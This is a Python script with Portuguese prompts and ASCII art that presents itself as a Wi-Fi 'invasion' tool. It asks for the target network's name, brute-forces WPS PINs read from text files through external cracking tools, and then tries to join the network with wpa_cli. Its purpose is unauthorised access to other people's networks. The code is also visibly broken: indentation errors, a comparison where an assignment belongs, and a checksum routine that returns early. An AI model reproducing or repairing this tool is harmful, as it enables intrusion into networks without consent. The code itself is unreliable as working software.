import time
import os
import netifaces
import subprocess
import itertools
os.system("clear")
vermelho = '\033[31m'
verde = '\033[32m'
ciano = '\033[36m'
magenta = '\033[35m'
amarelo = '\033[33m'
branco = '\033[37m'
print("\033[36m         _.-.")
print("       ,'/ //\ ")
print("      /// // /) ")
print("     /// // //| ")
print("    /// // /// ")
print("   /// // /// ")
print("  (`: // /// ")
print("   `;`: /// ")
print("\033[33m   / /"+"\033[36m:`:/")
print("\033[33m  / /"+"\033[36m  `'")
print("\033[33m / /")
print("(_/  ")
print(ciano+"\n.  ..__  __..                  , ")
print(ciano+"|  |[__)(__ |_    __ _.._.*._ -+- ")
print(ciano+"|/\||   .__)[ )  _) (_.[  |[_) | "+magenta+"Eu te amo amor S2")
                              

def get_wifi_interface():
    interfaces = netifaces.interfaces()
    for interface in interfaces:
        if "wlan" in interface:
            return interface
    return None
wifi_interface = get_wifi_interface()
time.sleep(1)
if wifi_interface:
    print(ciano)
    print(f"Nome da interface Wi-Fi: {wifi_interface}"+magenta+" (coloque a baixo)")
else:
    print(vermelho+"Nenhuma interface Wi-Fi encontrada.")
time.sleep(1)
print("\n")
print(ciano+"Digite onde você deseja começar.")
n=int(input(ciano+"["+magenta+"~"+ciano+"] "+magenta))
s=str(n)
print(ciano+"Qual o nome da rede que deseja invadir? ")
ssid = input(ciano+"["+magenta+"~"+ciano+"] "+magenta)
while True:
    with open("p1.txt", "r") as file:
    pin1 == file.readlines()
    def test_wps_pin(pin1):
        command = f"wps_pin.py -p {pin1}"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if "SUCCESS" in result.stdout:
            return True
        else:
            return False
    if test_wps_pin(pin1):
        print(verde+"Primeiros quatros digitos encontrados com sucesso!!")
        break
     else:
        print
while True:
    def connect_wifi(pin):
        command = f"wpscrack -i {wifi_interface} -s {ssid} -p {pin}"
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        return output.stdout

    def main():
            while True:
              with open("p2.txt", "r") as file:
               pin2 = file.readlines()
                vx=str(pin1)+str(pin2)
                vy=int(vx)
                def calculate_wps_pin(last_digit):
                    possible_digits = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
                    combinations = itertools.product(range(10), repeat=7)
                    for combination in combinations:
                        if (sum(combination) * 3 + last_digit) % 10 == 0:
                            pin = ''.join(str(digit) for digit in combination) + str(last_digit)
                            return pin
                        return None
                seven_digits = vy
                    last_digit = calculate_wps_pin(int(seven_digits))
                    lu=last_digit
                px=vx+str(lu)
                pin = int(px)
                os.system("clear")
                print("Testando PIN: "+ciano+pin)
                result = connect_wifi(pin)
                if "SUCCESS" in result:
                    print(verde)
                    print(f"Successo! PIN: {pin}")
                    def connect_to_wifi_with_wps_pin(pin):
                        command = f"wpa_cli -i wlan0 wps_reg {pin}"
                        output = subprocess.run(command, shell=True, capture_output=True, text=True)
                        if output.returncode == 0:
                            print(verde+"Conexão estabelecida com sucesso usando o PIN WPS!")
                        else:
                            print(vermelho+"Falha ao estabelecer a conexão usando o PIN WPS.")
                        connect_to_wifi_with_wps_pin(pin)
                else:
                    print(amarelo+"PIN inválido")

    if __name__ == "__main__":
        main()
